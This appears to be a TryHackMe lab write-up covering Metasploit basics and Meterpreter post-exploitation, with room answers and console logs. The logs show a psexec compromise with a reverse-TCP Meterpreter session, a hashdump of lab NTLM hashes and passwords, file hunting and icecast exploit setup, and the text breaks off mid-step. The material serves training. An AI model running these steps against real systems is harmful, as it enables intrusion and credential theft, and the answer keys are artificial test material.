# Metaspliot

Learn to use Metasploit, a tool to probe and exploit vulnerabilities on networks and servers.

[Metasploit](https://tryhackme.com/room/rpmetasploit)

## Topic's

* Metasploit Fundamentals
* Networking
* Network Enumeration
* Vulnerability Analysis
* Reverse Shell
* Exploitation
* Network Tunneling

## [Task 1] Intro 

Metasploit, an open-source pentesting framework, is a powerful tool utilized by security engineers around the world. Maintained by Rapid 7, Metasploit is a collection of not only thoroughly tested exploits but also auxiliary and post-exploitation tools. Throughout this room, we will explore the basics of using this massive framework and a few of the modules it includes.

The virtual machine used in this room (Ice), a worksheet version of this room, and the subsequent answer key can be downloaded for offline usage from https://darkstar7471.com/resources.html

1. Kali and most other security distributions of Linux include Metasploit by default. If you are using a different distribution of Linux, verify that you have it installed or install it from the Rapid 7 Github repository. 

`No answer needed`

## [Task 2] Initializing... 

If this is your first time using Metasploit, you'll have just a few things to do before you utilize its full functionality. Let's go ahead and get everything started!

1. First things first, we need to initialize the database! Let's do that now with the command: msfdb init

```
kali@kali:~/Downloads/ctf$ sudo msfdb init
[sudo] password for kali: 
[+] Starting database
[+] Creating database user 'msf'
[+] Creating databases 'msf'
[+] Creating databases 'msf_test'
[+] Creating configuration file '/usr/share/metasploit-framework/config/database.yml'
[+] Creating initial database schema
/usr/share/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/activerecord-4.2.11.1/lib/active_record/connection_adapters/abstract_adapter.rb:84: warning: deprecated Object#=~ is called on Integer; it always returns nil
kali@kali:~/Downloads/ctf$
```

`No answer needed`

2. Before starting Metasploit, we can view some of the advanced options we can trigger for starting the console. Check these out now by using the command: msfconsole -h

```
kali@kali:~/Downloads/ctf$ msfconsole -h
Usage: msfconsole [options]

Common options:
    -E, --environment ENVIRONMENT    Set Rails environment, defaults to RAIL_ENV environment variable or 'production'

Database options:
    -M, --migration-path DIRECTORY   Specify a directory containing additional DB migrations
    -n, --no-database                Disable database support
    -y, --yaml PATH                  Specify a YAML file containing database settings

Framework options:
    -c FILE                          Load the specified configuration file
    -v, -V, --version                Show version

Module options:
        --defer-module-loads         Defer module loading unless explicitly asked
    -m, --module-path DIRECTORY      Load an additional module path

Console options:
    -a, --ask                        Ask before exiting Metasploit or accept 'exit -y'
    -H, --history-file FILE          Save command history to the specified file
    -L, --real-readline              Use the system Readline library instead of RbReadline
    -o, --output FILE                Output to the specified file
    -p, --plugin PLUGIN              Load a plugin on startup
    -q, --quiet                      Do not print the banner on startup
    -r, --resource FILE              Execute the specified resource file (- for stdin)
    -x, --execute-command COMMAND    Execute the specified console commands (use ; for multiples)
    -h, --help                       Show this message
```

`No answer needed`

3. We can start the Metasploit console on the command line without showing the banner or any startup information as well. What switch do we add to msfconsole to start it without showing this information? This will include the '-'

`-q`

4. Once the database is initialized, go ahead and start Metasploit via the command: msfconsole

`No answer needed`

5. After Metasploit has started, let's go ahead and check that we've connected to the database. Do this now with the command: db_status

```
msf5 > db_status
[*] Connected to msf. Connection type: postgresql.
```

`No answer needed`

6. Cool! We've connected to the database, which type of database does Metasploit 5 use?

`postgresql`

## [Task 3] Rock 'em to the Core [Commands] 

Using the help menu, let's now learn the base commands and the module categories in Metasploit. Nearly all of the answers to the following questions can be found in the Metasploit help menu.

1. Let's go ahead and start exploring the help menu. On the Metasploit prompt (where we'll be at after we start Metasploit using msfconsole), type the command: help

2. The help menu has a very short one-character alias, what is it?

`?`

3. Finding various modules we have at our disposal within Metasploit is one of the most common commands we will leverage in the framework. What is the base command we use for searching?

`search`

4. Once we've found the module we want to leverage, what command we use to select it as the active module?

`use`

5. How about if we want to view information about either a specific module or just the active one we have selected?

`info`

6. Metasploit has a built-in netcat-like function where we can make a quick connection with a host simply to verify that we can 'talk' to it. What command is this?

`connect`

7. Entirely one of the commands purely utilized for fun, what command displays the motd/ascii art we see when we start msfconsole (without -q flag)?

`banner`

8. We'll revisit these next two commands shortly, however, they're two of the most used commands within Metasploit. First, what command do we use to change the value of a variable?

`set`

9. Metasploit supports the use of global variables, something which is incredibly useful when you're specifically focusing on a single box. What command changes the value of a variable globally?

`setg`

10. Now that we've learned how to change the value of variables, how do we view them? There are technically several answers to this question, however, I'm looking for a specific three-letter command which is used to view the value of single variables.

`get`

11. How about changing the value of a variable to null/no value?

`unset`

12. When performing a penetration test it's quite common to record your screen either for further review or for providing evidence of any actions taken. This is often coupled with the collection of console output to a file as it can be incredibly useful to grep for different pieces of information output to the screen. What command can we use to set our console output to save to a file?

`spool`

13. Leaving a Metasploit console running isn't always convenient and it can be helpful to have all of our previously set values load when starting up Metasploit. What command can we use to store the settings/active datastores from Metasploit to a settings file? This will save within your msf4 (or msf5) directory and can be undone easily by simply removing the created settings file.

`save`

## [Task 4] Modules for Every Occasion! 

Metasploit consists of six core modules that make up the bulk of the tools you will utilize within it. Let's take a quick look through the various modules, their purposes, and some of the commands associated with modules. 

![https://i.imgur.com/iYuiWvP.png](https://i.imgur.com/iYuiWvP.png)

1. Easily the most common module utilized, which module holds all of the exploit code we will use?

`exploit`

2. Used hand in hand with exploits, which module contains the various bits of shellcode we send to have executed following exploitation?

`payload`

3. Which module is most commonly used in scanning and verification machines are exploitable? This is not the same as the actual exploitation of course.

`auxiliary`

4. One of the most common activities after exploitation is looting and pivoting. Which module provides these capabilities?

`Post`

5. Commonly utilized in payload obfuscation, which module allows us to modify the 'appearance' of our exploit such that we may avoid signature detection?

`encoder`

6. Last but not least, which module is used with buffer overflow and ROP attacks?

`nop`

7. Not every module is loaded in by default, what command can we use to load different modules?

`load`

## Metasploit: Meterpreter
Take a deep dive into Meterpreter, and see how in-memory payloads can be used for post-exploitation.
[https://tryhackme.com/room/meterpreter]

# Task 5  Post-Exploitation Challenge

Meterpreter provides several important post-exploitation tools.
Commands mentioned previously, such as `getsystem`and `hashdump` will provide important leverage and information for privilege escalation and lateral movement. Meterpreter is also a good base you can use to run post-exploitation modules available on the Metasploit framework. Finally, you can also use the load command to leverage additional tools such as Kiwi or even the whole Python language.

```
meterpreter > load python
Loading extension python...Success.
meterpreter > python_execute "print 'TryHackMe Rocks!'"
[+] Content written to stdout:
TryHackMe Rocks!
```
The post-exploitation phase will have several goals; Meterpreter has functions that can assist all of them.
* Gathering further information about the target system.
* Looking for interesting files, user credentials, additional network interfaces, and generally interesting information on the target system.
* Privilege escalation.
* Lateral movement.
Once any additional tool is loaded using the `load` command, you will see new options on the `help` menu. The example below shows commands added for the Kiwi module (using the l`oad kiwi` command).

```
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/

Success.
```
These will change according to the loaded menu, so running the `help` command after loading a module is always a good idea.
```
Kiwi Commands
=============

    Command                Description
    -------                -----------
    creds_all              Retrieve all credentials (parsed)
    creds_kerberos         Retrieve Kerberos creds (parsed)
    creds_msv              Retrieve LM/NTLM creds (parsed)
    creds_ssp              Retrieve SSP creds
    creds_tspkg            Retrieve TsPkg creds (parsed)
    creds_wdigest          Retrieve WDigest creds (parsed)
    dcsync                 Retrieve user account information via DCSync (unparsed)
    dcsync_ntlm            Retrieve user account NTLM hash, SID and RID via DCSync
    golden_ticket_create   Create a golden kerberos ticket
    kerberos_ticket_list   List all kerberos tickets (unparsed)
    kerberos_ticket_purge  Purge any in-use kerberos tickets
    kerberos_ticket_use    Use a kerberos ticket
```
The questions below will help you have a better understanding of how Meterpreter can be used in post-exploitation.
You can use the credentials below to simulate an initial compromise over SMB (Server Message Block) (using exploit/windows/smb/psexec)

        Username: ballen
        Password: Password1

# Answer the questions below
# What is the computer name?   `ACME-TEST`
```
msf6 > use exploit/windows/smb/psexec
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/smb/psexec) > show options

Module options (exploit/windows/smb/psexec):

   Name               Current Setting  Required  Description
   ----               ---------------  --------  -----------
   RHOSTS                              yes       The target host(s), see https
                                                 ://docs.metasploit.com/docs/u
                                                 sing-metasploit/basics/using-
                                                 metasploit.html
   RPORT              445              yes       The SMB service port (TCP)
   SERVICE_DESCRIPTI                   no        Service description to be use
   ON                                            d on target for pretty listin
                                                 g
   SERVICE_DISPLAY_N                   no        The service display name
   AME
   SERVICE_NAME                        no        The service name
   SMBDomain          .                no        The Windows domain to use for
                                                  authentication
   SMBPass                             no        The password for the specifie
                                                 d username
   SMBSHARE                            no        The share to connect to, can
                                                 be an admin share (ADMIN$,C$,
                                                 ...) or a normal read/write f
                                                 older share
   SMBUser                             no        The username to authenticate
                                                 as


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thr
                                        ead, process, none)
   LHOST     10.10.243.229    yes       The listen address (an interface may b
                                        e specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic



View the full module info with the info, or info -d command.

msf6 exploit(windows/smb/psexec) > set RHOSTS 10.10.187.150
RHOSTS => 10.10.187.150
msf6 exploit(windows/smb/psexec) > set SMBUser ballen
SMBUser => ballen
msf6 exploit(windows/smb/psexec) > set SMBPass Password1
SMBPass => Password1
msf6 exploit(windows/smb/psexec) > run

[*] Started reverse TCP handler on 10.10.243.229:4444 
[*] 10.10.187.150:445 - Connecting to the server...
[*] 10.10.187.150:445 - Authenticating to 10.10.187.150:445 as user 'ballen'...
[*] 10.10.187.150:445 - Selecting PowerShell target
[*] 10.10.187.150:445 - Executing the payload...
[+] 10.10.187.150:445 - Service start timed out, OK if running a command or non-service executable...
[*] Sending stage (175686 bytes) to 10.10.187.150
[*] Meterpreter session 1 opened (10.10.243.229:4444 -> 10.10.187.150:51632) at 2024-01-24 02:25:27 +0000

meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /root/pAeXAnRa.html
[*] Streaming...
[-] Error running command screenshare: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.
meterpreter > [GFX1-]: Unrecognized feature ACCELERATED_CANVAS2D
[2024-01-24T02:26:15Z ERROR viaduct::backend::ffi] Missing HTTP status
[2024-01-24T02:26:15Z ERROR viaduct::backend::ffi] Missing HTTP status

meterpreter > ps

Process List
============

 PID   PPID  Name         Arch  Session  User               Path
 ---   ----  ----         ----  -------  ----               ----
 0     0     [System Pro
             cess]
 4     0     System       x64   0
 68    4     Registry     x64   0
 396   4     smss.exe     x64   0
 548   536   csrss.exe    x64   0
 620   612   csrss.exe    x64   1
 672   536   wininit.exe  x64   0
 688   612   winlogon.ex  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
             e                           EM                 2\winlogon.exe
 752   672   services.ex  x64   0
             e
 764   672   lsass.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\lsass.exe
 812   688   dwm.exe      x64   1        Window Manager\DW  C:\Windows\System3
                                         M-1                2\dwm.exe
 888   752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 904   752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 956   752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 992   752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1068  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1188  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1200  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1208  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1256  752   svchost.exe  x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\svchost.exe
 1392  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1408  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 1444  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 1716  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 2176  1872  powershell.  x86   0        NT AUTHORITY\SYST  C:\Windows\SysWOW6
             exe                         EM                 4\WindowsPowerShel
                                                            l\v1.0\powershell.
                                                            exe
 2232  688   fontdrvhost  x64   1        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-1             2\fontdrvhost.exe
 2240  672   fontdrvhost  x64   0        Font Driver Host\  C:\Windows\System3
             .exe                        UMFD-0             2\fontdrvhost.exe
 2304  752   spoolsv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\spoolsv.exe
 2332  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 2348  752   svchost.exe  x64   0        NT AUTHORITY\LOCA  C:\Windows\System3
                                         L SERVICE          2\svchost.exe
 2380  752   amazon-ssm-  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             agent.exe                   EM                 mazon\SSM\amazon-s
                                                            sm-agent.exe
 2420  752   svchost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\svchost.exe
 2452  752   LiteAgent.e  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             xe                          EM                 mazon\XenTools\Lit
                                                            eAgent.exe
 2488  752   dfsrs.exe    x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\dfsrs.exe
 2500  752   Microsoft.A  x64   0        NT AUTHORITY\SYST  C:\Windows\ADWS\Mi
             ctiveDirect                 EM                 crosoft.ActiveDire
             ory.WebServ                                    ctory.WebServices.
             ices.exe                                       exe
 2508  752   ismserv.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\ismserv.exe
 2536  752   dfssvc.exe   x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\dfssvc.exe
 2628  752   dns.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\dns.exe
 2928  2380  ssm-agent-w  x64   0        NT AUTHORITY\SYST  C:\Program Files\A
             orker.exe                   EM                 mazon\SSM\ssm-agen
                                                            t-worker.exe
 2936  2928  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 3012  752   vds.exe      x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\vds.exe
 3156  688   LogonUI.exe  x64   1        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\LogonUI.exe
 3232  2176  conhost.exe  x64   0        NT AUTHORITY\SYST  C:\Windows\System3
                                         EM                 2\conhost.exe
 3624  752   msdtc.exe    x64   0        NT AUTHORITY\NETW  C:\Windows\System3
                                         ORK SERVICE        2\msdtc.exe

meterpreter > migrate 764
[*] Migrating from 2176 to 764...
[*] Migration completed successfully.
meterpreter > screenshare
[*] Preparing player...
[*] Opening player at: /root/irrmieor.html
[*] Streaming...
[-] Error running command screenshare: Rex::RuntimeError Current session was spawned by a service on Windows 8+. No desktops are available to screenshot.
meterpreter > [GFX1-]: Unrecognized feature ACCELERATED_CANVAS2D
[2024-01-24T02:28:53Z ERROR viaduct::backend::ffi] Missing HTTP status
[2024-01-24T02:28:53Z ERROR viaduct::backend::ffi] Missing HTTP status

meterpreter > sysinfo
Computer        : ACME-TEST
OS              : Windows Server 2019 (10.0 Build 17763).
Architecture    : x64
System Language : en_US
Domain          : FLASH
Logged On Users : 7
Meterpreter     : x64/windows
meterpreter > 
```
 
# What is the target domain?   `FLASH`
```
msf6 exploit(windows/smb/psexec) > use post/windows/gather/enum_domain
msf6 post(windows/gather/enum_domain) > show options

Module options (post/windows/gather/enum_domain):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_domain) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                 Connection
  --  ----  ----                     -----------                 ----------
  1         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ ACME  10.10.243.229:4444 -> 10.10
                                     -TEST                       .187.150:51632 (10.10.187.1
                                                                 50)

msf6 post(windows/gather/enum_domain) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_domain) > run

[+] Domain FQDN: FLASH.local
[+] Domain NetBIOS Name: FLASH
[+] Domain Controller: ACME-TEST.FLASH.local (IP: 10.10.187.150)
[*] Post module execution completed
```

# What is the name of the share likely created by the user?   `speedster`
```
msf6 post(windows/gather/enum_domain) > use post/windows/gather/enum_shares
msf6 post(windows/gather/enum_shares) > show options

Module options (post/windows/gather/enum_shares):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  true             yes       Enumerate currently configured shares
   ENTERED  true             yes       Enumerate recently entered UNC Paths in the Run Dialo
                                       g
   RECENT   true             yes       Enumerate recently mapped shares
   SESSION                   yes       The session to run this module on


View the full module info with the info, or info -d command.

msf6 post(windows/gather/enum_shares) > set SESSION 1
SESSION => 1
msf6 post(windows/gather/enum_shares) > run

[*] Running module against ACME-TEST (10.10.187.150)
[*] The following shares were found:
[*] 	Name: SYSVOL
[*] 	Path: C:\Windows\SYSVOL\sysvol
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: NETLOGON
[*] 	Path: C:\Windows\SYSVOL\sysvol\FLASH.local\SCRIPTS
[*] 	Remark: Logon server share 
[*] 	Type: DISK
[*] 
[*] 	Name: speedster
[*] 	Path: C:\Shares\speedster
[*] 	Type: DISK
[*] 
[*] Post module execution completed
```
 
# What is the NTLM hash of the jchambers user?  `69596c7aa1e8daee17f8e78870e25a5c`
```
msf6 post(windows/gather/enum_shares) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:58a478135a93ac3bf058a5ea0e8fdb71:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:a9ac3de200cb4d510fed7610c7037292:::
ballen:1112:aad3b435b51404eeaad3b435b51404ee:64f12cddaa88057e06a81b54e73b949b:::
jchambers:1114:aad3b435b51404eeaad3b435b51404ee:69596c7aa1e8daee17f8e78870e25a5c:::
jfox:1115:aad3b435b51404eeaad3b435b51404ee:c64540b95e2b2f36f0291c3a9fb8b840:::
lnelson:1116:aad3b435b51404eeaad3b435b51404ee:e88186a7bb7980c913dc90c7caa2a3b9:::
erptest:1117:aad3b435b51404eeaad3b435b51404ee:8b9ca7572fe60a1559686dba90726715:::
ACME-TEST$:1008:aad3b435b51404eeaad3b435b51404ee:eec208ef4eee9839fb5d8f0a77dde8b8:::
```

# What is the cleartext password of the jchambers user?  `Trustno1`

# Where is the "secrets.txt"  file located? (Full path of the file)  `c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt `
```
meterpreter > search -f secrets.txt
Found 1 result...
=================

Path                                                            Size (bytes)  Modified (UTC)
----                                                            ------------  --------------
c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt  35            2021-07-30 08:44:27 +0100

meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd "Program Files (x86)"
meterpreter > pwd
C:\Program Files (x86)
meterpreter > ls
Listing: C:\Program Files (x86)
===============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2021-03-11 07:29:52 +0000  AWS SDK for .NET
040777/rwxrwxrwx  4096  dir   2021-03-11 07:29:53 +0000  AWS Tools
040777/rwxrwxrwx  0     dir   2018-09-15 08:28:48 +0100  Common Files
040777/rwxrwxrwx  4096  dir   2020-03-18 06:47:41 +0000  Internet Explorer
040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  Microsoft.NET
040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Defender
040777/rwxrwxrwx  0     dir   2018-09-15 08:19:03 +0100  Windows Mail
040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Media Player
040777/rwxrwxrwx  0     dir   2021-07-30 21:33:31 +0100  Windows Multimedia Platform
040777/rwxrwxrwx  4096  dir   2021-01-13 21:21:12 +0000  Windows Photo Viewer
040777/rwxrwxrwx  0     dir   2018-09-15 08:19:03 +0100  Windows Portable Devices
040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  Windows Sidebar
040777/rwxrwxrwx  0     dir   2018-09-15 08:19:00 +0100  WindowsPowerShell
100666/rw-rw-rw-  174   fil   2018-09-15 08:16:48 +0100  desktop.ini
040777/rwxrwxrwx  0     dir   2018-09-15 08:28:48 +0100  windows nt

meterpreter > cd "Windows Multimedia Platform"
meterpreter > pwd
C:\Program Files (x86)\Windows Multimedia Platform
meterpreter > ls
Listing: C:\Program Files (x86)\Windows Multimedia Platform
===========================================================

Mode              Size   Type  Last modified              Name
----              ----   ----  -------------              ----
100666/rw-rw-rw-  35     fil   2021-07-30 08:44:27 +0100  secrets.txt
100666/rw-rw-rw-  40432  fil   2018-09-15 08:12:04 +0100  sqmapi.dll

meterpreter > cat secrets.txt
My Twitter password is KDSvbsw3849!
```

# What is the Twitter password revealed in the "secrets.txt" file? `KDSvbsw3849`

# Where is the "realsecret.txt" file located? (Full path of the file) `c:\inetpub\wwwroot\realsecret.txt `
```
meterpreter > search -f realsecret.txt
Found 1 result...
=================

Path                               Size (bytes)  Modified (UTC)
----                               ------------  --------------
c:\inetpub\wwwroot\realsecret.txt  34            2021-07-30 09:30:24 +0100

meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd ..
meterpreter > cd "inetpub"
meterpreter > pwd
C:\inetpub
meterpreter > cd "wwwroot"
meterpreter > cat realsecret.txt
The Flash is the fastest man alive
```
# What is the real secret?   `The Flash is the fastest man alive`

## [Task 5] Move that shell! 

Remember that database we set up? In this step, we're going to take a look at what we can use it for and exploit our victim while we're at it!

As you might have noticed, up until this point we haven't touched nmap in this room, let alone perform much recon on our victim box. That'll all change now as we'll take a swing at using nmap within Metasploit. Go ahead and deploy the box now, it may have up to a three-minute delay for starting up our target vulnerable service.

*Note, Metasploit does support different types of port scans from within the auxiliary modules. Metasploit can also import other scans from nmap and Nessus just to name a few.

1. Metasploit comes with a built-in way to run nmap and feed it's results directly into our database. Let's run that now by using the command 'db_nmap -sV BOX-IP'

```
msf5 > db_nmap -sV 10.10.223.155
[*] Nmap: Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-11 04:57 EDT
[*] Nmap: Nmap scan report for 10.10.223.155
[*] Nmap: Host is up (0.067s latency).
[*] Nmap: Not shown: 988 closed ports
[*] Nmap: PORT      STATE SERVICE            VERSION
[*] Nmap: 135/tcp   open  msrpc              Microsoft Windows RPC
[*] Nmap: 139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn
[*] Nmap: 445/tcp   open  microsoft-ds       Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
[*] Nmap: 3389/tcp  open  ssl/ms-wbt-server?
[*] Nmap: 5357/tcp  open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
[*] Nmap: 8000/tcp  open  http               Icecast streaming media server
[*] Nmap: 49152/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49153/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49154/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49158/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49159/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: 49160/tcp open  msrpc              Microsoft Windows RPC
[*] Nmap: Service Info: Host: DARK-PC; OS: Windows; CPE: cpe:/o:microsoft:windows
[*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 71.23 seconds
```

`No answer needed`

2. What service does nmap identify running on port 135?

`msrpc`

3. Let's go ahead and see what information we have collected in the database. Try typing the command 'hosts' into the msfconsole now.

```
msf5 > hosts

Hosts
=====

address        mac  name  os_name  os_flavor  os_sp  purpose  info  comments
-------        ---  ----  -------  ---------  -----  -------  ----  --------
10.10.223.155             Unknown                    device         
```

`No answer needed`

4. How about something else from the database, try the command 'services' now.

```
msf5 > services
Services
========

host           port   proto  name               state  info
----           ----   -----  ----               -----  ----
10.10.223.155  135    tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  139    tcp    netbios-ssn        open   Microsoft Windows netbios-ssn
10.10.223.155  445    tcp    microsoft-ds       open   Microsoft Windows 7 - 10 microsoft-ds workgroup: WORKGROUP
10.10.223.155  3389   tcp    ssl/ms-wbt-server  open   
10.10.223.155  5357   tcp    http               open   Microsoft HTTPAPI httpd 2.0 SSDP/UPnP
10.10.223.155  8000   tcp    http               open   Icecast streaming media server
10.10.223.155  49152  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49153  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49154  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49158  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49159  tcp    msrpc              open   Microsoft Windows RPC
10.10.223.155  49160  tcp    msrpc              open   Microsoft Windows RPC
```

`No answar needed`

5. One last thing, try the command 'vulns' now. This won't show much at the current moment, however, it's worth noting that Metasploit will keep track of discovered vulnerabilities. One of the many ways the database can be leveraged quickly and powerfully.

```
msf5 > vulns

Vulnerabilities
===============

Timestamp  Host  Name  References
---------  ----  ----  ----------
```

`No answar needed`

6. Now that we've scanned our victim system, let's try connecting to it with a Metasploit payload. First, we'll have to search for the target payload. In Metasploit 5 (the most recent version at the time of writing) you can simply type 'use' followed by a unique string found within only the target exploit. For example, try this out now with the following command 'use icecast'. What is the full path for our exploit that now appears on the msfconsole prompt? *This will include the exploit section at the start

```
msf5 > use icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


[*] Using exploit/windows/http/icecast_header
```

`exploit/windows/http/icecast_header`

7. While that use command with the unique string can be incredibly useful that's not quite the exploit we want here. Let's now run the command 'search multi/handler'. What is the name of the column on the far left side of the console that shows up next to 'Name'? Go ahead and run the command 'use NUMBER_NEXT_TO exploit/multi/handler` wherein the number will be what appears in that far left column (typically this will be 4 or 5). In this way, we can use our search results without typing out the full name/path of the module we want to use.

```
msf5 exploit(windows/http/icecast_header) > search multi/handler

Matching Modules
================

   #  Name                                                 Disclosure Date  Rank       Check  Description
   -  ----                                                 ---------------  ----       -----  -----------
   0  auxiliary/scanner/http/apache_mod_cgi_bash_env       2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   1  exploit/android/local/janus                          2017-07-31       manual     Yes    Android Janus APK Signature bypass
   2  exploit/linux/local/apt_package_manager_persistence  1999-03-09       excellent  No     APT Package Manager Persistence
   3  exploit/linux/local/bash_profile_persistence         1989-06-08       normal     No     Bash Profile Persistence
   4  exploit/linux/local/desktop_privilege_escalation     2014-08-07       excellent  Yes    Desktop Linux Password Stealer and Privilege Escalation
   5  exploit/linux/local/yum_package_manager_persistence  2003-12-17       excellent  No     Yum Package Manager Persistence
   6  exploit/multi/handler                                                 manual     No     Generic Payload Handler
   7  exploit/windows/browser/persits_xupload_traversal    2009-09-29       excellent  No     Persits XUpload ActiveX MakeHttpRequest Directory Traversal
   8  exploit/windows/mssql/mssql_linkcrawler              2000-01-01       great      No     Microsoft SQL Server Database Link Crawling Command Execution
```

```
msf5 exploit(windows/http/icecast_header) > use 4 exploit/multi/handler
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`#`

8. Now type the command 'use NUMBER_FROM_PREVIOUS_QUESTION'. This is the short way to use modules returned by search results.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > use 4
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`No answer needed`

9. Next, let's set the payload using this command 'set PAYLOAD windows/meterpreter/reverse_tcp'. In this way, we can modify which payloads we want to use with our exploits. Additionally, let's run this command 'set LHOST YOUR_IP_ON_TRYHACKME'. You might have to check your IP using the command 'ip addr', it will likely be your tun0 interface.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf5 exploit(linux/local/desktop_privilege_escalation) > set LHOST 10.8.106.222
LHOST => 10.8.106.222
msf5 exploit(linux/local/desktop_privilege_escalation) >
```

`No answer needed`

10. Let's go ahead and return to our previous exploit, run the command `use icecast` to select it again.

```
msf5 exploit(linux/local/desktop_privilege_escalation) > use icecast

Matching Modules
================

   #  Name                                 Disclosure Date  Rank   Check  Description
   -  ----                                 ---------------  ----   -----  -----------
   0  exploit/windows/http/icecast_header  2004-09-28       great  No     Icecast Header Overwrite


[*] Using exploit/windows/http/icecast_header
```

`No answer needed`

11. One last step before we can run our exploit. Run the command 'set RHOSTS BOX_IP' to tell Metasploit which target to attack.

```
